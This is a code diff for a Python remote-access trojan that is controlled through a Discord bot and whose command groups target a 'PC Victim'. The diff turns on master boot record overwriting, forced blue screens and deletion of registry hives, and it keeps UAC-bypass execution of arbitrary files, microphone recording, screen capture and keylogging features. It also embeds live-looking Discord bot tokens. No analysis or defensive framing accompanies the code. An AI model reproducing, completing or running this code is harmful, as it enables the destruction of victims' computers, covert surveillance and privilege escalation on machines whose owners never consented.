@@ -1,8 +1,9 @@
 __import__('sys').path.append('../')
-import discord, asyncio, os, subprocess, requests, psutil, json, win32api, win32con, threading, time, asyncio
+import discord, asyncio, os, subprocess, requests, psutil, json, threading, time
 import pygame.camera
 import pygame.image
 import pygame.mixer
+import wavio as wv
 import sounddevice as sd
 from PIL import ImageGrab
 from core.info import Info
@@ -10,7 +11,6 @@ from core.sender import Sender
 from discord.ext import commands
 from urllib.parse import urlparse
 from pretty_help import PrettyHelp
-from scipy.io.wavfile import write
 from pynput import keyboard, mouse
 from core.destroy_window import DestroyWindow
 from winpwnage.functions.uac.uacMethod1 import uacMethod1
@@ -41,17 +41,22 @@ class Destroy(commands.Cog, description='Destory PC Victim'):
 	async def MBROverwrite(self, ctx, HWID: str, ):
 		if not CheckHWID(HWID):
 			return
-		# DestroyWindow.MBROverwrite()
+		await SendOutput(ctx, 'Starting MBR Overwrite')
+		DestroyWindow.MBROverwrite()
 
 	@commands.command(aliases=["bsod"], brief='Blue Screen Of Death', description='Blue Screen Of Death')
-	async def BSOD(self, ctx, HWID: str, method, ):
+	async def BSOD(self, ctx, HWID: str):
 		if not CheckHWID(HWID):
 			return
+		await SendOutput(ctx, 'Starting BSOD')
+		DestroyWindow.BSOD()
 
 	@commands.command(aliases=["regdelete"], brief='Delete HKCU and HKLM/System', description='Delete HKCU and HKLM/System')
 	async def RegistryDelete(self, ctx, HWID: str, ):
 		if not CheckHWID(HWID):
 			return
+		await SendOutput(ctx, 'Starting Delete Registry')
+		DestroyWindow.RegistryDelete()
 
 class Control(commands.Cog, description='Control PC Victim'):
 
@@ -157,27 +162,22 @@ class Control(commands.Cog, description='Control PC Victim'):
 				command = f'cmd /c {path_file}'
 				uacMethod1(['C:\\Windows\\System32\\cmd.exe', command])
 				output = str(subprocess.check_output(command, shell=True), 'utf-8')
-				# await SendOutput(ctx, output)
 			elif method == 'powershell':
 				command = f'powershell -WindowStyle Hidden -Command "Start-Process -FilePath {path_file} -Wait"'
 				uacMethod1(['C:\\Windows\\System32\\cmd.exe', command])
 				output = str(subprocess.check_output(command, shell=True), 'utf-8')
-				# await SendOutput(ctx, output)
 		threading.Thread(target = subp, args=(method,)).start()
 		await SendOutput(ctx, 'Run Done!\n')
 
 	@commands.command(aliases=["msgbox", "mbox"], brief='Message Box To PC Victim', description='Message Box To PC Victim')
-	async def MessageBox(self, ctx, HWID: str, method = 'msg', amount: int = 1, caption: str = 'Lol', *, message):
+	async def MessageBox(self, ctx, HWID: str, amount: int = 1, caption: str = 'Lol', *, message):
 		if not CheckHWID(HWID):
 			return
 		def msg(amount, method, message):
 			for i in range(amount):
-				if method == 'msg':
-					command = f'cmd /c msg * {message}'
-					uacMethod1(['C:\\Windows\\System32\\cmd.exe', command])
-					output = str(subprocess.check_output(command, shell=True), 'utf-8')	
-				elif method == 'msgbox':
-					win32api.MessageBox(win32con.NULL, message, caption)	
+				command = f'cmd /c msg * {message}'
+				uacMethod1(['C:\\Windows\\System32\\cmd.exe', command])
+				output = str(subprocess.check_output(command, shell=True), 'utf-8')	
 		threading.Thread(target = msg, args = (amount, method, message, )).start()
 		await SendOutput(ctx, "Done!")
 
@@ -294,7 +294,7 @@ class Control(commands.Cog, description='Control PC Victim'):
 				   samplerate=freq, channels=2)
 		await SendOutput(ctx, "Starting Recording")
 		sd.wait()
-		write(path_audio, freq, recording)
+		wv.write(path_audio, recording, freq, sampwidth=2)
 		await SendOutput(ctx, "Recording Success")
 		if os.path.getsize(path_audio) < 25000000:
 			filename = os.path.basename(path_audio)
@@ -412,4 +412,4 @@ async def on_ready():
 	await client.add_cog(Control())
 	await client.add_cog(OtherCommands())
 
-client.run('MTEyODk0MTcwMzAzNDgzNDk2NA.Gl7HMH.cw-bTbk2gMUE-9yHK1brCIAyr2atHGizP6U3aY')
+client.run('MTEyODk0MTcwMzAzNDgzNDk2NA.G8b_eP.UBMC8F2ETPzOMEof3XRtc_EdGhGoZv0hZrW-3c')
